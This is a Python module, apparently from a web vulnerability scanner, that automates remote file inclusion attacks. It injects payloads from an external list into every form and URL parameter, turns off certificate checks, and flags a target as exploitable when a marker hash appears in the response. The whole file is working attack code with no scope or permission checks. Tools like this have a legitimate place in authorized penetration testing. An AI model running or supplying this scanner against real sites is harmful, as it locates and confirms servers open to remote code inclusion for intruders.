# RFI patch clear
import requests
import os
import re
import time
import json

def make_GET_form(url):
    dic={}
    dic['vuln']='RFI'
    dic['method']='GET'
    dic['url']=url
    print("RFI GET FIND" )
    return dic

def make_POST_form(url,data):
    dic={}
    dic['vuln']='RFI'
    dic['method']='POST'
    dic['url']=url
    dic['data']=data
    print("rfi POST FIND")
    return dic

def get_request(data, dic, target,cookies):
    key_list = list(dic.keys())
    for payload_name in key_list:
        tmp = dic.copy()
        tmp[payload_name] = '@@@@@@'
        middle_form = target
        key_list_tmp = list(tmp.keys())
        for idx, key in enumerate(key_list_tmp):
            if idx == 0:
                middle_form = middle_form + '?' + key + '=' + tmp[key]
            else:
                middle_form = middle_form + '&' + key + '=' + tmp[key]
        for payload in data:
            final_form = middle_form.replace('@@@@@@', payload.strip())
            print(final_form)
            try:
                test_res = requests.get(final_form, cookies=cookies,verify=False)
                if check_success(test_res.text):
                    return make_GET_form(final_form)
            except:
                print("ERROR on RFI" + target)
                time.sleep(2)
    return False


def scan_type1(url: str, params: dict,cookies):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/rfi.txt', "r") as f:
        data = f.readlines()

    for items in params.values():
        target = url + items['action']
        method = items['method']
        dic = {}
        for ipt in items['inputs']:
            dic[ipt['name']] = ipt['value']

        if method == 'post':
            key_list = list(dic.keys())
            for payload_name in key_list:
                tmp = dic.copy()
                for payload in data:
                    tmp[payload_name] = payload.strip()
                    try:
                        test_res = requests.post(target, data=tmp, cookies=cookies,verify=False)
                        if check_success(test_res.text):
                            return make_POST_form(target, tmp)
                    except:
                        print("ERROR on RFI " + target)
                        time.sleep(2)
        elif method == 'get':
            return get_request(data, dic, target,cookies)
        else:
            print('Error in ' + target + ', method type must be assigned')
            return False
    return False

def scan_type2(url: str, cookies):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/rfi.txt', "r") as f:
        data = f.readlines()
    params = re.split('[=&?]', url)
    target = params[0]
    del (params[0])
    key = ''
    dic = {}
    for i in range(len(params)):
        if i % 2 == 0:
            key = params[i]
        else:
            dic[key] = params[i]

    return get_request(data, dic, target, cookies)

def check_success(res):
    if re.search(r'705cd559b16e6946826207c2199bd890', res):  # check hash
        return True
    return False


def rfi_attack(arg1: str, arg2,cookies):
    if arg1.startswith('http'):
        return scan_type1(arg1, arg2,cookies)
    elif arg1 == 'get':
        return scan_type2(arg2,cookies)
    else:
        print('Error in RFI_attack')
        return False